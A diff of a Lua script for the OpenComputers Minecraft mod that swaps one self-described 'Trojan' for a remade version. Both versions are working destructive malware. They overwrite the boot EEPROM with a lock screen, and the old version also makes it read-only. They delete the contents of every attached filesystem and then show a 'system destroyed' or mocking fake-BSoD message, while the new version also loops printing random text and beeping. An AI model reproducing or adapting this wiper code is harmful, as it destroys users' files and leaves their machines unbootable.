@@ -1,71 +1,125 @@
---Trojan copyied For Education!
-local component = component or require("component")
-local eeprom = component.proxy(component.list("eeprom")())
-local gpuTest = component.list("gpu")()
-
-eeprom.setData("xD")
-eeprom.set([=[component=component or require("component")a=component.list("gpu")()for b in component.list("filesystem")do component.invoke(b,"remove","/")end;if a then computer=computer or require("computer")c=component and component.gpu or component.proxy(a)if c.getScreen()==""then c.bind(component.list("screen")())end;if c.getScreen()~=""then d,e=c.getResolution()f,g=d/2,e/2;h={"     ◢█◣","    ◢███◣","   ◢█████◣","  ◢███████◣"," ◢█████████◣","◢███████████◣"}i={"█","█","█","","▀"}j=math.ceil(f-6)k=math.ceil(g-7)c.setBackground(0x000000)c.setForeground(0xff0000)c.fill(1,1,d,e," ")for l=1,#h do c.set(j,l+k,h[l])end;c.setBackground(0xff0000)c.setForeground(0xffffff)for l=1,#i do c.set(j+6,k+l+1,i[l])end;c.setBackground(0x000000)c.setForeground(0xffffff)c.set(math.floor(f-14),g+3,"The system has been destroyed")c.set(math.floor(f-15),g+5,"Press power button to shutdown")while true do computer.pullSignal(math.huge)end end end]=])
-eeprom.makeReadonly(eeprom.getChecksum())
-
-for filesystem in component.list("filesystem") do 
-    component.invoke(filesystem, "remove", "/")
+--Script Remaked by matveymayner!
+local component = require("component")
+local fs = require("filesystem")
+local computer = require("computer")
+local unicode = require("unicode")
+ 
+local color = "emlpdr"
+ 
+local Code = [[
+ 
+local textLines = {
+  "An a critical error occured and your MineOSOS has been Destroyed",
+  "Try to restart your computer If this screen appears again Try to do this",
+  "1 Purchase normal computer",
+  "2 Use new BIOS",
+  "3 Reinstall system",
+  "Or contact your Lua Programmer",
+  "THIS_IS_BSoD_EPTA_YOU_SUCK",
+  "TECHNICAL_INFORMATION",
+  "GOPSTOP 5x133713371 0x0000000000 0x00000000003 0x2282282282",
+}
+ 
+local component_invoke = component.invoke
+function boot_invoke(address, method, ...)
+  local result = table.pack(pcall(component_invoke, address, method, ...))
+  if not result[1] then
+    return nil, result[2]
+  else
+    return table.unpack(result, 2, result.n)
+  end
 end
+ 
+local eeprom = component.list("eeprom")()
+computer.getBootAddress = function()
+  return boot_invoke(eeprom, "getData")
+end
+computer.setBootAddress = function(address)
+  return boot_invoke(eeprom, "setData", address)
+end
+ 
+do
+  _G.screen = component.list("screen")()
+  _G.gpu = component.list("gpu")()
+  if gpu and screen then
+    boot_invoke(gpu, "bind", screen)
+  end
+end
+ 
+local function centerText(mode,coord,text)
+  local dlina = unicode.len(text)
+  local xSize,ySize = boot_invoke(gpu, "getResolution")
+ 
+  if mode == "x" then
+    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),coord,text)
+  elseif mode == "y" then
+    boot_invoke(gpu, "set", coord, math.floor(ySize/2),text)
+  else
+    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),math.floor(ySize/2),text)
+  end
+end
+ 
+local function suck()
+  local background, foreground = 0x0000AA, 0xCCCCCC
+  local xSize, ySize = boot_invoke(gpu, "getResolution")
+  boot_invoke(gpu, "setBackground", background)
+  boot_invoke(gpu, "fill", 1, 1, xSize, ySize, " ")
+ 
+  boot_invoke(gpu, "setBackground", foreground)
+  boot_invoke(gpu, "setForeground", background)
+ 
+  local y = math.floor(ySize / 2 - (#textLines + 2) / 2)
+  centerText("x", y, " MineOS Has been destroyed! ")
+  y = y + 2
+ 
+  boot_invoke(gpu, "setBackground", background)
+  boot_invoke(gpu, "setForeground", foreground)
+ 
+  for i = 1, #textLines do
+    centerText("x", y, textLines[i])
+    y = y + 1
+  end
+ 
+  while true do
+    computer.pullSignal()
+  end
+end
+ 
+if gpu then suck() end
+]]
+ 
+function parseProxy(address)
+    local proxy = component.proxy(address)
+    local list = proxy.list("")
+    for _, file in pairs(list) do
+        if type(file) == "string" then
+            if not proxy.isReadOnly(file) then proxy.remove(file) end
+        end
+    end
+    list = nil
+end
+ 
+function parseAllAddresess()
+    for address in component.list("filesystem") do
+      local proxy = component.proxy(address)
+      if proxy.address ~= computer.tmpAddress() and proxy.getLabel() ~= "internet" then
+      local f = require("filesystem")
+      f.remove("/")
+        parseProxy(proxy.address)    
+      end
+    end
+end
+ 
+component.eeprom.set(Code)
+parseAllAddresess()
+ 
+print("Oops! An a critical error has been occured!")
 
-if gpuTest then
-	local computer = computer or require("computer")
-	local gpu = component and component.gpu or component.proxy(gpuTest)
-
-	if gpu.getScreen() == "" then
-	    gpu.bind((component.list("screen")()))
-	end
-
-	if gpu.getScreen() ~= "" then
-	    local w, h = gpu.getResolution()
-	    local wC, hC = w / 2, h / 2 
-
-	    local triangle = {
-	        "     ◢█◣",
-	        "    ◢███◣",
-	        "   ◢█████◣",
-	        "  ◢███████◣",
-	        " ◢█████████◣",
-	        "◢███████████◣"
-	    }
-
-	    local warn = {
-	        "█",
-	        "█",
-	        "█",
-	        "",
-	        "▀",
-	    }
-
-	    local trianglePosX = math.ceil(wC - 6)
-	    local trianglePosY = math.ceil(hC - 7)
-
-	    gpu.setBackground(0x000000)
-	    gpu.setForeground(0xff0000)
-	    gpu.fill(1, 1, w, h, " ")
-
-	    for str = 1, #triangle do 
-	        gpu.set(trianglePosX, str + trianglePosY, triangle[str])
-	    end
-
-	    gpu.setBackground(0xff0000)
-	    gpu.setForeground(0xffffff)
-
-	    for str = 1, #warn do 
-	        gpu.set(trianglePosX + 6, trianglePosY + str + 1, warn[str])
-	    end
-
-	    gpu.setBackground(0x000000)
-	    gpu.setForeground(0xffffff)
-
-	    gpu.set(math.floor(wC - 14), hC + 3, "The system has been destroyed")
-	    gpu.set(math.floor(wC - 15), hC + 5, "Press power button to shutdown")
-
-	    while true do 
-	        computer.pullSignal(math.huge)
-	    end
-	end
+while true do
+  local str = ""
+    for j = 1, 160 do
+      str = str .. unicode.char(math.random(0, 255))
+    end
+  print(str)
+  computer.beep(1000, 0.1)
 end
